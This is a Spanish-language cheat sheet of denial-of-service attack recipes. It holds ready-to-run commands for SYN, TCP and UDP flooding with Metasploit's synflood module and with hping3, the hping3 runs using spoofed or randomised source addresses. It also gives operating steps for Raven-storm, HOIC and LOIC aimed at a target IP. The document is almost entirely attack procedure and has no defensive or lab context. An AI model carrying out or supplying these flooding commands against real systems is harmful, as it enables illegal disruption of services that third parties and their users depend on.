# Ataques DoS o DDoS

Tags: #Hacking #DoS #DDoS

## Metasploit (SYN flooding)

```bash 
# Kali Tool 
❯ msfconsole -q           # Iniciar Metasploit 

	❯ use auxiliary/dos/tcp/synflood
	❯ options 
	❯ set RHOSTS IP
	❯ set RPORT 21
	❯ set SHOST IP       # Dirección IP de la máquina quien enviará los paquetes
	❯ run 
```

## Hping3

```bash 
# Kali Tool 
❯ hping3 -S IP_Target -a Spoof_IP -p 22 --flood 

	# S = Bandera de sincronización 
	# q = Dirección IP de la máquina quien enviará los paquetes
	# p = Especifica el puerto destino 
	# flood = Envia una gran cantidad de paquetes 

❯ hping3 -d 65538 -S -p 21 --flood IP_Target --rand-source 

	# d = Especifica el tamaño de la data 
	# rand-source = Genera IPs aleatorias 

❯ hping3 -2 -p 139 --flood IP_Target 

	# 2 = Especifica el modo UDP
```

## Raven-storm

```bash 
# Kali Tool 
❯ rst         # Ejecutar la herramienta 

	❯ l4                    # Módulo en capa 4 (UDP/TCP)
		❯ ip IP_Target     # Agregar la dirección IP a atacar 
		❯ port 80          # Puerto a atacar 
		❯ threads 20000  
		❯ run 
```

## HOIC (High Orbit Ion Canon)

```bash 
# Windows Tool 
❯ hoic2.1.exe           # Ejecutar el programa 

Nota:
	1. Dar click en '+' para seleccionar la dirección IP target 'http://IP'
	2. Seleccionar 'High' y 'GenericBoost.hoic'
	3. Colocar 20 'THREADS'
	4. Dar click en 'FIRE TEH LAZER!' para iniciar el ataque 
```

## LOIC (Low Orbit Ion Canon)

```bash 
# Windows Tool 
❯ loic1.0.8.exe         # Ejecutar el programa 

Nota:
	1. Colocar la URL o la dirección IP target y dar click en 'Lock on' 
	2. Agregar UDP en 'Method'
	3. Colocar la barra de 'Speed' en la mitad  
	4. Dar click en 'IMMA CHARGIN MAH LAZER' para iniciar el ataque 
```